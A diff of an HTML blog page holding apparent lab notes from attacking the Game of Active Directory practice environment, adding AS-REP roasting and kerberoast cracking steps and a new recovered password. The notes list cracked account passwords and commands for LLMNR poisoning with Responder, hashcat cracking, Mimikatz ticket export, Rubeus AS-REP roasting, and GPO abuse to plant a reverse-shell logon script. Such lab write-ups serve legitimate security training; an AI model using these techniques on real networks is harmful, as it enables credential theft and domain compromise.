@@ -59,13 +59,13 @@
  
 
 <meta name="author" content="Jack69" />
-<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing Initial Enumeration # Nmap 7.95 scan initiated Tue Jan 28 09:36:12 2025 as: /usr/lib/nmap/nmap -sC -sV -iL targets.txt -oN common-port-scanning …" />
+<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople Todo: Password spraying using username as password: write powershell script Initial Enumeration # Nmap 7.95 scan initiated Tue Jan 28 09:36:12 2025 …" />
 <meta name="keywords" content="">
 
 
   <meta property="og:site_name" content="Jack's Corner"/>
   <meta property="og:title" content="Game of Active Directory Notes"/>
-  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing Initial Enumeration # Nmap 7.95 scan initiated Tue Jan 28 09:36:12 2025 as: /usr/lib/nmap/nmap -sC -sV -iL targets.txt -oN common-port-scanning …"/>
+  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople Todo: Password spraying using username as password: write powershell script Initial Enumeration # Nmap 7.95 scan initiated Tue Jan 28 09:36:12 2025 …"/>
   <meta property="og:locale" content="en_US"/>
   <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/goad.html"/>
   <meta property="og:type" content="article"/>
@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a><ul><li><a class="toc-href" href="#smb-relayable" title="SMB Relayable">SMB Relayable</a></li></ul></li><li><a class="toc-href" href="#llmnr-poisoning_1" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a></li><li><a class="toc-href" href="#silver-ticket" title="Silver Ticket">Silver Ticket</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a><ul><li><a class="toc-href" href="#smb-relayable" title="SMB Relayable">SMB Relayable</a></li></ul></li><li><a class="toc-href" href="#llmnr-poisoning_1" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a></li><li><a class="toc-href" href="#silver-ticket" title="Silver Ticket">Silver Ticket</a></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -168,8 +168,16 @@
 <td>NORTH\jon.snow</td>
 <td>iknownothing</td>
 </tr>
+<tr>
+<td>NORTH\brandon.stark</td>
+<td>iseedeadpeople</td>
+</tr>
 </tbody>
 </table>
+<p>Todo:</p>
+<ul>
+<li>Password spraying using username as password: write powershell script</li>
+</ul>
 <h2 id="initial-enumeration">Initial Enumeration</h2>
 <div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">initiated</span><span class="w"> </span><span class="nx">Tue</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">nmap</span><span class="o">/</span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">iL</span><span class="w"> </span><span class="nx">targets</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">common</span><span class="o">-</span><span class="nx">port</span><span class="o">-</span><span class="nx">scanning</span><span class="p">.</span><span class="nx">nmap</span>
 <span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.10</span>
@@ -546,7 +554,7 @@
 <p>Poison DNS and capture NTLMv2 hashes:</p>
 <div class="highlight"><pre><span></span><code>sudo ./Responder.py -I eth0 -v
 </code></pre></div>
-<p><img alt="llmnr-poisoning.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/llmnr-poisoning.png"/></p>
+<p><img alt="north-llmnr-poisoning.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-llmnr-poisoning.png"/></p>
 <p>Cracking the captured hashes:</p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
@@ -555,38 +563,38 @@
 </code></pre></div>
 <h2 id="plaintext-password">Plaintext Password</h2>
 <p>After enumerating users with <code>robb.stark</code>, a cleartext password for user <code>samwell.tarly</code> is found in the description property:</p>
-<p><img alt="users-enumetation.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/users-enumetation.png"/></p>
+<p><img alt="north-users-enumetation.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-users-enumetation.png"/></p>
 <h2 id="gpo-abuse">GPO Abuse</h2>
 <div class="highlight"><pre><span></span><code>Get-GPO -All
 </code></pre></div>
-<p><img alt="gpo-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/gpo-enumeration.png"/></p>
+<p><img alt="north-gpo-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-enumeration.png"/></p>
 <div class="highlight"><pre><span></span><code><span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">"StarkWallpaper"</span> <span class="n">-All</span>
 </code></pre></div>
-<p><img alt="gpo-permissions-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/gpo-permissions-enumeration.png"/></p>
+<p><img alt="north-gpo-permissions-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-permissions-enumeration.png"/></p>
 <p><code>samwell.tarly</code> has read and write permission on the <code>StarkWallpaper</code> GPO.</p>
 <p><code>samwell.tarly</code> cannot RDP to 10.1.0.11; having its password, it's possible to inject its network credentials using <code>runas</code> and open the <strong>Microsoft Management Console</strong> (<code>mmc.exe</code>) from another user session in order to edit the GPO:</p>
 <div class="highlight"><pre><span></span><code>runas.exe<span class="w"> </span>/netonly<span class="w"> </span>/user:NORTH<span class="se">\s</span>amwell.tarly<span class="w"> </span>mmc.exe
 </code></pre></div>
-<p><img alt="gpo-startup-script.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/gpo-startup-script.png"/></p>
+<p><img alt="north-gpo-startup-script.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-startup-script.png"/></p>
 <p>The script <code>reverse.ps1</code> will open a reverse shell each time a user logs in.</p>
 <p>Note that this GPO applies to all authenticated users:</p>
-<p><img alt="gpo-security-filtering.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/gpo-security-filtering.png"/></p>
+<p><img alt="north-gpo-security-filtering.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-security-filtering.png"/></p>
 <p>Force GPO applying:</p>
 <div class="highlight"><pre><span></span><code>gpupdate<span class="w"> </span>/force
 </code></pre></div>
 <h2 id="shares-enumeration">Shares Enumeration</h2>
 <div class="highlight"><pre><span></span><code>net<span class="w"> </span>share
 </code></pre></div>
-<p><img alt="shares-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/shares-enumeration.png"/></p>
+<p><img alt="north-shares-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-shares-enumeration.png"/></p>
 <p>An interesting share <code>NETLOGON</code> is found, containing two sensitive files:</p>
 <ul>
 <li><code>script.ps1</code>: contains cleartext password for the user </li>
 </ul>
-<p><img alt="script-ps1-content.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/script-ps1-content.png"/></p>
+<p><img alt="north-script-ps1-content.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-script-ps1-content.png"/></p>
 <ul>
 <li><code>secret.ps1</code>: containing an encrypted secret but also the key.</li>
 </ul>
-<p><img alt="secret-ps1-content.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/secret-ps1-content.png"/></p>
+<p><img alt="north-secret-ps1-content.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-secret-ps1-content.png"/></p>
 <div class="highlight"><pre><span></span><code><span class="c"># cypher script  </span>
 <span class="c"># $domain="sevenkingdoms.local"  </span>
 <span class="c"># $EncryptionKeyBytes = New-Object Byte[] 32  </span>
@@ -619,9 +627,9 @@
 <p>Enumerating SPNs:</p>
 <div class="highlight"><pre><span></span><code>setspn<span class="w"> </span>-T<span class="w"> </span>NORTH<span class="w"> </span>-Q<span class="w"> </span>*/*
 </code></pre></div>
-<p><img alt="Pasted image 20250201165330.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250201165330.png"/></p>
-<p>Following steps have been conducted from a RDP session since a Kerberos error was being returned:</p>
-<p><img alt="Pasted image 20250201170510.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250201170510.png"/></p>
+<p><img alt="north-spns.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-spns.png"/></p>
+<p>Following steps have been conducted from a RDP session since a Kerberos error was being returned using Evil-WinRM:</p>
+<p><img alt="north-kerberos-error.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-kerberos-error.png"/></p>
 <p>Requesting TGS for the three SPNs accounts</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
 
@@ -631,10 +639,33 @@
 </code></pre></div>
 <div class="highlight"><pre><span></span><code>klist
 </code></pre></div>
-<p><img alt="Pasted image 20250201170931.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250201170931.png"/></p>
+<p><img alt="north-kerberoasting-tickets.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-kerberoasting-tickets.png"/></p>
 <p>Dump tickets using <code>Invoke-Mimikatz</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"kerberos::list /export"'</span>
 </code></pre></div>
+<p>Convert kirbi tickets to john/hashcat format:</p>
+<div class="highlight"><pre><span></span><code>/usr/share/kerberoast/kirbi2john.py<span class="w"> </span>&lt;kirbi<span class="w"> </span>ticket<span class="w"> </span>path&gt;<span class="w"> </span>&gt;<span class="w"> </span>&lt;outputpath&gt;
+</code></pre></div>
+<p>And crack each ticket with hashcat:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>&lt;ticket<span class="w"> </span>path&gt;<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<p>The TGS for <code>CIFS/thewall.north.sevenkingdoms.local</code> gets successfully decrypted using rockyou:</p>
+<p><img alt="north-kerbearoasting-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-kerbearoasting-cracking.png"/></p>
+<p>User <code>NORTH\jon.snow</code>'s password is <code>iknownothing</code>.</p>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<p>Find AS-REP-roastable users:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span>
+</code></pre></div>
+<p><img alt="north-asreproasting-users.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-asreproasting-users.png"/></p>
+<p>Request TGS for <code>brandon.stark</code> using <code>Invoke-Rubeus</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Invoke-Rubeus</span> <span class="n">-Command</span> <span class="s2">"asreproast /user:brandon.stark /nowrap"</span>
+</code></pre></div>
+<p><img alt="north-asproasting-request-tgs.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-asproasting-request-tgs.png"/></p>
+<p>Crack TGS with hashcat:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>&lt;ticket&gt;<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<p><img alt="north-asproasting-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-asproasting-cracking.png"/></p>
+<p>User <code>NORTH\brandon.stark</code>'s password is <code>iseedeadpeople</code>.</p>
 <h2 id="golden-ticket">Golden Ticket</h2>
 <p>TODO</p>
 <h2 id="silver-ticket">Silver Ticket</h2>
